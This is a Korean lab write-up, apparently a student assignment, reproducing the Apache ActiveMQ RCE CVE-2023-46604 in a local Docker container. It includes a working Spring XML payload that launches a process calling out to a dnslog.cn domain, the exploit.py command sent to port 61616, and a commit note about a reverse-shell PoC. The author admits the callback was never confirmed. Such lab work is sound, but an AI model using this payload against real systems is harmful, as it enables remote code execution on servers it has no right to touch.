# 개요

- **CVE ID**: CVE-2023-46604
- **대상 소프트웨어**: Apache ActiveMQ ≤ 5.15.14
- **취약점 종류**: Remote Code Execution (RCE)
- **심각도**: Critical (CVSS 9.8)
- **요약**:
    
    Apache ActiveMQ의 OpenWire 프로토콜 처리 중 역직렬화된 객체를 검증 없이 실행하면서, 원격에서 임의의 시스템 명령을 실행할 수 있는 취약점입니다.
    

---

# 실습 환경 구성

### ✅ 사용 환경

- Windows 11 + Docker Desktop
- Python 내장 HTTP 서버
- GitHub (Fork 및 커밋용)

### ✅ Docker 이미지 실행

```bash
docker run -d --name activemq -p 8161:8161 -p 61616:61616 rmohr/activemq:5.15.9-alpine
```

- 관리자 웹 접속 주소: `http://localhost:8161`
- 로그인 정보: `admin / admin`

---

## **Docker 이미지 다운로드 완료**

```
docker pull rmohr/activemq:5.15.9-alpine
```


---

## **컨테이너 실행 확인**

```
docker ps
```


---

## **ActiveMQ 웹 UI 접속 확인**

- `http://localhost:8161` 접속


---

# 공격 준비 (PoC 설정)

### ✅ `poc.xml`

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>ping</value>
        <value>abcxyz.dnslog.cn</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

---

### ✅ HTTP 서버 실행

```bash
python -m http.server 8000
```


---

# 익스플로잇 수행

### ✅ exploit.py 실행

```bash
python exploit.py -i 127.0.0.1 -p 61616 -u http://127.0.0.1:8000/poc.xml
```


---

### ✅ 공격 성공 여부 확인


- 실습 당시 Interactsh가 도메인을 발급하지 못해 실제 요청 수신 로그는 확인하지 못하였지,  exploit 스크립트가 정상 동작하고 서버 응답도 있었기 때문에 PoC 실행 흐름은 재현을 완료하였습니다.

---

# GitHub

- 레포지토리: https://github.com/myonggyu/whs
- 커밋 내역:
    - `feat: add PoC XML with reverse shell`
    - `feat: add exploit.py`
    - `docs: update README.md`
- `exploit.py`, `poc.xml`, `docker-compose.yml` 포함
- 커밋 및 파일 확인 가능

> 🖼️ github_commit.png
> 
> 
> 🖼️ `github_structure.png`
> 

---

# 정리

<aside>
💡

이번 과제를 통해 **Apache ActiveMQ의 RCE 취약점(CVE-2023-46604)** 을 직접 재현하며, **실제 원격 코드 실행(Exploit) 흐름**을 경험해볼 수 있었습니다.

Docker를 이용해 빠르게 환경을 구성하고, `exploit.py`를 통해 XML 기반 페이로드를 전송하면서 ActiveMQ 서버가 이를 실행하는 구조를 체험하였습니다. 특히 **역직렬화(Deserialization)** 와 관련된 보안 취약점이 얼마나 쉽게 악용될 수 있는지를 확인한 점이 매우 인상 깊었습니다.

</aside>
